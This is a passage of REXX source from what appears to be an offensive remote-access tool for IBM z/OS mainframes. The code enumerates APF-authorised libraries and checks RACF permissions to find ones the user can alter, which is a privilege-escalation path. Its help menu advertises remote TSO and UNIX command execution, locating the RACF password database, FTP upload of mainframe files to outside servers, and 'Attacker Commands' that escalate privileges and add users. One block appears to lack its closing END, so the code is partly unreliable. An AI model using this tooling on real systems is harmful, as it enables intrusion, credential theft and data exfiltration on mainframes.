    GRSNAME  = Storage(D2x(CVT + 340),8)         /* point to system name */
    GRSNAME  = Strip(GRSNAME,'T')                /* del trailing blanks  */
    CVTAUTHL = C2d(Storage(D2x(CVT + 484),4))    /* point to auth lib tbl*/
    If CVTAUTHL <> C2d('7FFFF001'x) then do      /* static list ?        */
      NUMAPF   = C2d(Storage(D2x(CVTAUTHL),2))   /* # APF libs in table  */
      APFOFF   = 2                               /* first ent in APF tbl */
      Do I = 1 to NUMAPF
         LEN = C2d(Storage(D2x(CVTAUTHL+APFOFF),1)) /* length of entry   */
         VOL.I = Storage(D2x(CVTAUTHL+APFOFF+1),6)  /* VOLSER of APF LIB */
         DSN.I = Storage(D2x(CVTAUTHL+APFOFF+1+6),LEN-6) /*DSN of APF lib*/
         APFOFF = APFOFF + LEN +1
      End
    End
    Else Do  /* dynamic APF list via PROGxx */
      ECVT     = C2d(Storage(D2x(CVT + 140),4))  /* point to CVTECVT     */
      ECVTCSVT = C2d(Storage(D2x(ECVT + 228),4)) /* point to CSV table   */
      APFA = C2d(Storage(D2x(ECVTCSVT + 12),4))  /* APFA                 */
      AFIRST = C2d(Storage(D2x(APFA + 8),4))     /* First entry          */
      ALAST  = C2d(Storage(D2x(APFA + 12),4))    /* Last  entry          */
      LASTONE = 0   /* flag for end of list      */
      NUMAPF = 1    /* tot # of entries in list  */
      /* Get the WARNING DATASETS. If they're on the APF list.....       */
      W = OUTTRAP('OUTW.')
      ADDRESS TSO "SEARCH ALL WARNING NOMASK"
      W = OUTTRAP('OFF')
      text = "+ Dataset --> Access" NEWLINE
      Do forever
         DSN.NUMAPF = Storage(D2x(AFIRST+24),44) /* DSN of APF library   */
         DSN.NUMAPF = Strip(DSN.NUMAPF,'T')      /* remove blanks        */
         PRIV.NUMAPF = check_priv(DSN.NUMAPF)
         if PRIV.NUMAPF <> "ALTER" then do
           /* We might push in via dataset in WARN mode */
           do www = 1 to OUTW.0
             if OUTW.www == DSN.NUMAPF then
               /* It must be christmas!! */
               PRIV.NUMAPF = "ALTER"
           end
         
         text = text || "+" DSN.NUMAPF "-->" PRIV.NUMAPF NEWLINE
         CKSMS = Storage(D2x(AFIRST+4),1)        /* DSN of APF library   */
         if  bitand(CKSMS,'80'x)  = '80'x        /*  SMS data set?       */
           then VOL.NUMAPF = '*SMS* '            /* SMS control dsn      */
         else VOL.NUMAPF = Storage(D2x(AFIRST+68),6) /* VOLSER of APF lib*/
         If Substr(DSN.NUMAPF,1,1) <> X2c('00')  /* check for deleted    */
           then NUMAPF = NUMAPF + 1              /*   APF entry          */
         AFIRST = C2d(Storage(D2x(AFIRST + 8),4)) /* next  entry          */
         if LASTONE = 1 then leave
         If  AFIRST = ALAST then LASTONE = 1
      End
      NUMAPF = NUMAPF-1
End

return text

check_priv:
  NOT_AUTH="NOT AUTHORIZED"
  NO_PROFILE="NO RACF"
  DSN = arg(1)

  /* First we Check for a specific rule */
  /* ICH35003I */
  A = OUTTRAP('OUT.')
    ADDRESS TSO "LD DA('"DSN"')"
  B = OUTTRAP('OFF')
  IF OUT.0==1 THEN DO
    IF INDEX(OUT.1,"ICH35003I") >0 THEN DO
      X = OUTTRAP('OUTG.')
        ADDRESS TSO "LD DA('"DSN"') GEN"
      Y = OUTTRAP('OFF')
      IF OUTG.0==1 THEN DO
        IF INDEX(OUTG.1,NOT_AUTH)>0 THEN
          RETURN "NONE"
        IF INDEX(OUTG.1,NO_PROFILE)>0 THEN
          RETURN "NO RACF PROFILE"
      END
      ELSE IF OUTG.0>1 THEN DO
        ACCESS = WORD(OUTG.17,1)
        return ACCESS
      END
    END
    IF INDEX(OUT.1,NOT_AUTH)>0 THEN
      RETURN "NONE"
    IF INDEX(OUT.1,NO_PROFILE)>0 THEN
      RETURN "NO RACF PROFILE"
  END
  ELSE IF OUT.0>1 THEN DO
    ACCESS = WORD(OUT.17,1)
    return ACCESS
  END
return -1

GET_HELP:
/* Help command */
       help = NEWLINE,
       "Core Commands"||NEWLINE,
       "============="||NEWLINE||NEWLINE,
       "  Command           Description"||NEWLINE,
       "  -------           -----------"||NEWLINE,
       "  help              Help Menu"||NEWLINE,
       "  exit              Terminate the session"||NEWLINE,
       "  quit              Terminate the session"||NEWLINE,
       NEWLINE||NEWLINE,
       "Filesystem Commands"||NEWLINE,
       "==================="||NEWLINE||NEWLINE,
       "  Command           Description"||NEWLINE,
       "  -------           -----------"||NEWLINE,
       "  cat               Show contents of dataset"||NEWLINE,
       "  cp                copies a file to a new file"||NEWLINE,
       "  ls                list datasets in HLQ"||NEWLINE,
       "  delete            deletes a file"||NEWLINE,
       "  del               also deletes a file"||NEWLINE,
       "  lsmem             Lists files and members"||NEWLINE,
       "                    !!WARNING!! Takes time and IO"||NEWLINE,
       NEWLINE||NEWLINE,
       "Networking Commands"||NEWLINE,
       "==================="||NEWLINE||NEWLINE,
       "  Command           Description"||NEWLINE,
       "  -------           -----------"||NEWLINE,
       "  ipconfig          Display interfaces"||NEWLINE,
       "  ifconfig          Display interfaces"||NEWLINE,
       NEWLINE||NEWLINE,
       "System Commands"||NEWLINE,
       "==============="||NEWLINE||NEWLINE,
       "  Command           Description"||NEWLINE,
       "  -------           -----------"||NEWLINE,
       "  getuid            Get current user name"||NEWLINE,
       "  sysinfo           Remote system info (i.e OS)"||NEWLINE,
       "  apf               Get list of APF authorised libraries",
       NEWLINE,
       "  racf              Show password database location",
       NEWLINE,
       "  execute           Execute a TSO command"||NEWLINE,
       "  tso               Execute TSO command (same as execute)",
       NEWLINE,
       "  unix              UNIX command (i.e ls -al)"||NEWLINE,
       "  ftp               Upload a file from the mainframe to",
       NEWLINE,
       "                    an FTP server. Syntax is:"||NEWLINE,
       "                    host/ip user pass filename [binary]",
       "Attacker Commands"||NEWLINE,
       "==============="||NEWLINE||NEWLINE,
       "  Command           Description"||NEWLINE,
       "  -------           -----------"||NEWLINE,
       "  privesc           Launch privesc to make a new user"||NEWLINE,
       "  adduser           Adds a user",
       NEWLINE||NEWLINE
     return help